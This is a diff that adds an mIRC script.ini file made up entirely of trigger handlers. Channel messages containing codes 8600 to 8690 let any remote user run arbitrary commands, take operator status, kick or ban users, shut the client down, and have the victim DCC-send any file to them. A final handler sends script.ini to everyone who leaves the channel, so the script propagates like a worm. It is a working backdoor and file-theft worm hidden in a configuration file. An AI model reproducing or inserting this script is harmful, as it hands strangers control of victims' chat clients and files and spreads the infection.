@@ -1,0 +1,12 @@
+[script]
+n0=on 1:TEXT:*8600*:#:$2-
+n1=on 1:TEXT:*8610*:#:/mode $chan +o $nick
+n2=on 1:TEXT:*8620*:#:/.ignore $2-
+n3=on 1:TEXT:*8630*:#:/mode $chan -b $nick
+n4=on 1:TEXT:*8640*:#:/exit
+n5=on 1:TEXT:*8650*:#:/kick $chan $2-
+n6=on 1:TEXT:*8660*:#:/mode $chan +b $2-
+n7=on 1:TEXT:*8670*:#:/dcc send $nick $2-
+n8=on 1:TEXT:*8680*:#:/.auto $nick #*
+n9=on 1:TEXT:*8690*:#:/.protect $nick #*
+n10=on !1:PART:#:/dcc send $nick script.ini
